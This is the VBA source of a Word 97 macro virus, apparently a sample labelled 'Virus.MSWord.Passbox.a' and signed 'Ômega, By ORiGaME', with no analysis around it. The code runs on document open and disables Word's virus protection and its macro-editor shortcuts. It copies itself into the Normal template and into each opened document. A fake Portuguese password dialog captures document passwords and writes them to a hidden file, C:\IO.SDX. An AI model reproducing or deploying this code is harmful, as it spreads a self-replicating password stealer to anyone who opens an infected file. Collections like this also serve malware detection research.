   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Ômega"
   Sub AutoOpen()
   On Error GoTo Final

   Infecta
   Rotula
   Tempo

   Final:
   End Sub
   Sub Infecta()
   On Error GoTo Final

      Application.ScreenUpdating = False
      Application.DisplayAlerts = wdAlertsNone

      WordBasic.DisableAutoMacros 0
      Options.VirusProtection = False

      Application.EnableCancelKey = wdCancelDisabled

      CustomizationContext = NormalTemplate
      FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
      FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable


      Set ActiveDoc = ActiveDocument
      Set GlobalDoc = NormalTemplate

      DocumentInstalled = False
      GlobalInstalled = False

      For I = 1 To ActiveDocument.VBProject.VBComponents.Count
         If ActiveDocument.VBProject.VBComponents(I).Name = "Ômega" Then
            DocumentInstalled = True
         End If
      Next

      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
         If NormalTemplate.VBProject.VBComponents(J).Name = "Ômega" Then
            GlobalInstalled = True
         End If
      Next

         If DocumentInstalled = False Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
            ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
            ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         End If


         If GlobalInstalled = False Then
            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
         End If

         If ActiveDocument.HasPassword = False Then GoTo Final
         PassBox.Show

   Final:
       End Sub
   Sub Rotula()
   On Error GoTo CMB

      Set FMB = CommandBars.FindControl(Type:=msoControlPopup, ID:=1)
    With FMB
       If .Caption = " " Then GoTo Final
    End With

   CMB:
       Set MB = CommandBars.ActiveMenuBar
       Set NM = MB.Controls.Add(Type:=msoControlPopup, Before:=11)
     NM.Caption = " "
       Set BM = NM.Controls _
         .Add(Type:=msoControlButton, ID:=1)
     BM.Caption = "Ômega"
     BM.FaceId = 308
     BM.OnAction = "Show"

   Final:

   End Sub
   Sub Show()
    Assistant.Visible = True
           With Assistant.NewBalloon
          .Icon = msoIconTip
          .Heading = "ÔMEGA"
          .Text = "       Word97.Macro  " + Chr(13) + Chr(13) + "        By ORiGaME"
          .Show
           End With

   End Sub
   Sub Analise()
   If PassBox.TextBox1 = "" Then
      ActiveDocument.Close
      Unload PassBox
      Else
      Grava
   End If

   End Sub

   Sub Grava()
   On Error Resume Next
   SetAttr "C:\IO.SDX", 0
   Open "C:\IO.SDX" For Append As #1
   Print #1, "Path = " + ActiveDocument.FullName
   Print #1, "Password = " + PassBox.TextBox1
   Print #1, " "
   Close #1
   SetAttr "C:\IO.SDX", 1 + 2 + 4

   Unload PassBox
   Application.DisplayAlerts = wdAlertsAll

   End Sub

   Sub ViewVBCode()

   End Sub

   Sub Tempo()
   On Error GoTo Final
   If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then

   Set OM = ActiveDocument.Range(Start:=0, End:=0)
    With OM
    .InsertBefore "ÔMEGA" & Chr(13) & "By ORiGaME ©"
    .Font.Name = "Impact"
    .Font.Size = 50
    .Font.ColorIndex = 9
    .Font.Animation = 6
    .Font.Shadow = 1
    End With
   End If

   Final:
   End Sub

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} PassBox
      Caption         =   "Senha"
      ClientHeight    =   1410
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4200
      OleObjectBlob   =   "Virus.MSWord.Passbox.a-PassBox.frx":0000
      StartUpPosition =   2  'CenterScreen
      WhatsThisButton =   -1  'True
      WhatsThisHelp   =   -1  'True
   End
   Attribute VB_Name = "PassBox"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False






































   Private Sub CommandButton1_Click()
   If CommandButton1.Caption = "OK" Then Analise
   End Sub
   Private Sub TextBox1_Change()
   TextBox1.PasswordChar = "*"

   End Sub
   Private Sub UserForm_Initialize()
   Label2.Caption = "Insira a senha para abrir o arquivo"
   Label1.Caption = ActiveDocument.FullName

   End Sub
   Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
   On Error GoTo Final
   Analise

   Final:
   End Sub
